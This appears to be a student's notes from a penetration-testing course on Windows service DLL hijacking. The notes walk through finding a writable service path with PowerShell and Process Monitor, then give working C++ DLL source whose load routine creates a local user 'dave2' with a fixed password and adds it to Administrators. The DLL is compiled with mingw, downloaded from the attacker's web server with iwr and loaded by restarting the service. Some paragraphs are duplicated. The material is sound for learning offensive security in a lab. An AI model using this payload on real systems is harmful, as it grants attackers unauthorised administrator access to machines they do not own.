# Service DLL Hijacking

**Search for binaries**

```
PS C:\Users\steve> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

Name                      State   PathName
----                      -----   --------
...
BetaService               Running C:\Users\steve\Documents\BetaServ.exe
...
```

**Checking permissions**

```
PS C:\Users\steve> icacls .\Documents\BetaServ.exe
.\Documents\BetaServ.exe NT AUTHORITY\SYSTEM:(F)
                         BUILTIN\Administrators:(F)
                         CLIENTWK220\steve:(RX)
                         CLIENTWK220\offsec:(F)

Successfully processed 1 files; Failed processing 0 files
```

**We need admin privs to research the processes going on with this binary**

Without any filters, the information provided by Process Monitor
can be quite overwhelming. Multiple new list entries are added every
second. For now, we are only interested in events related to the
process *BetaServ* of the target service, so we can create a filter
to only include events related to it. For this, we'll click on the
*Filter* menu > *Filter...* to get into the filter configuration.

The filter consists of four conditions. Our goal is that Process
Monitor only shows events related to the *BetaServ* Process. We
enter the following arguments: *Process Name* as *Column*, *is* as
*Relation*, *BetaServ.exe* as *Value*, and *Include* as *Action*.
Once entered, we'll click on *Add*.

![https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/winprivesc/430e1aa80d980c8e9160be549733996c-privesc_svcdll_pmfilter.png](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/winprivesc/430e1aa80d980c8e9160be549733996c-privesc_svcdll_pmfilter.png)

Figure 5: Add Filter for BetaServ.exe

After applying the filter, the list is empty. In order to analyze the
service binary, we should try restarting the service as the binary
will then attempt to load the DLLs.

Without any filters, the information provided by Process Monitor
can be quite overwhelming. Multiple new list entries are added every
second. For now, we are only interested in events related to the
process *BetaServ* of the target service, so we can create a filter
to only include events related to it. For this, we'll click on the
*Filter* menu > *Filter...* to get into the filter configuration.

The filter consists of four conditions. Our goal is that Process
Monitor only shows events related to the *BetaServ* Process. We
enter the following arguments: *Process Name* as *Column*, *is* as
*Relation*, *BetaServ.exe* as *Value*, and *Include* as *Action*.
Once entered, we'll click on *Add*.

![https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/winprivesc/430e1aa80d980c8e9160be549733996c-privesc_svcdll_pmfilter.png](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/winprivesc/430e1aa80d980c8e9160be549733996c-privesc_svcdll_pmfilter.png)

Figure 5: Add Filter for BetaServ.exe

After applying the filter, the list is empty. In order to analyze the
service binary, we should try restarting the service as the binary
will then attempt to load the DLLs.

In PowerShell, we enter **Restart-Service**[5](https://portal.offsec.com/courses/pen-200-44065/learning/windows-privilege-escalation-45276/leveraging-windows-services-47210/service-dll-hijacking-45285#fn-local_id_3093-5) with
**BetaService** as argument, while Process Monitor is running in the
background.

```
PS C:\Users\steve> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...

```

> Listing 59 - Restarting BetaService
> 

Listing 59 shows that we could successfully
restart *BetaService*.

Checking Process Monitor, we notice that numerous events appeared.
Scrolling down in the list, various *CreateFile* calls can be found
in the *Operation* column. The *CreateFile* function can be used to
create or open a file.

![https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/winprivesc/96d3cc822281c7d597412e0b78698a2f-privesc_svcdll_dllsearch.png](https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PEN-200/imgs/winprivesc/96d3cc822281c7d597412e0b78698a2f-privesc_svcdll_dllsearch.png)

Figure 6: Add Filter for BetaServ.exe

Figure 6 shows that the *CreateFile*
calls attempted to open a file named **myDLL.dll** in several paths.
The *Detail* column states *NAME NOT FOUND* for these calls, which
means that a DLL with this name couldn't be found in any of these
paths.

The consecutive function calls follow the DLL search order from
Listing 56, starting with the directory
the application is located in and ending with the directories in
the *PATH* environment variable. We can confirm this by displaying
the contents of this environment variable with **$env:path** in
PowerShell.

```
PS C:\Users\steve> $env:path
C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Windows\System32\OpenSSH\;C:\Users\steve\AppData\Local\Microsoft\WindowsApps;

```

Let's reuse the C code from the previous section by adding the
*include* statement as well as the system function calls to the C++
DLL code. Additionally, we need to use an *include* statement for the
header file **windows.h**, since we use Windows specific data types
such as *BOOL*. The final code is shown in the following listing.

```
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user dave2 password123! /add");
  	    i = system ("net localgroup administrators dave2 /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}

```

> Listing 62 - C++ DLL example code from Microsoft
> 

Now, let's cross-compile the code with *mingw*. We use the same
command as in the previous section but change the input code file, the
output name, and add **--shared** to specify that we want to build a
DLL.

```
kali@kali:~$ x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll

```

> Listing 63 - Cross-Compile the C++ Code to a 64-bit DLL
> 

Once the DLL is compiled, we can transfer it to CLIENTWK220. We can
start a Python3 web server on Kali in the directory the DLL is located
in and use **iwr** in a PowerShell window on the target machine.
Before we download the file, we change our current directory to
the **Documents** folder of *steve* to download it into the correct
directory for our attack. Additionally, we confirm that *dave2*
doesn't exist yet on the system with the **net user** command.

```
PS C:\Users\steve> cd Documents

PS C:\Users\steve\Documents> iwr -uri http://192.168.119.3/myDLL.dll -Outfile myDLL.dll

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
daveadmin                DefaultAccount           Guest
offsec                   steve                    WDAGUtilityAccount
The command completed successfully.

```

> Listing 64 - Download compiled DLL
> 

**myDLL.dll** is now located in the **Documents** folder of *steve*,
which is the first path in the DLL search order. After we restart
*BetaService*, our DLL should be loaded into the process and the code
to create the user *dave2* as member of the local *Administrators*
group in *DLL_PROCESS_ATTACH* should be executed.

```
PS C:\Users\steve\Documents> Restart-Service BetaService
WARNING: Waiting for service 'BetaService (BetaService)' to start...
WARNING: Waiting for service 'BetaService (BetaService)' to start...

PS C:\Users\steve\Documents> net user
User accounts for \\CLIENTWK220

-------------------------------------------------------------------------------
Administrator            BackupAdmin              dave
dave2                    daveadmin                DefaultAccount
Guest                    offsec                   steve
WDAGUtilityAccount
The command completed successfully.

PS C:\Users\steve\Documents> net localgroup administrators
...
Administrator
BackupAdmin
dave2
daveadmin
offsec
The command completed successfully.

```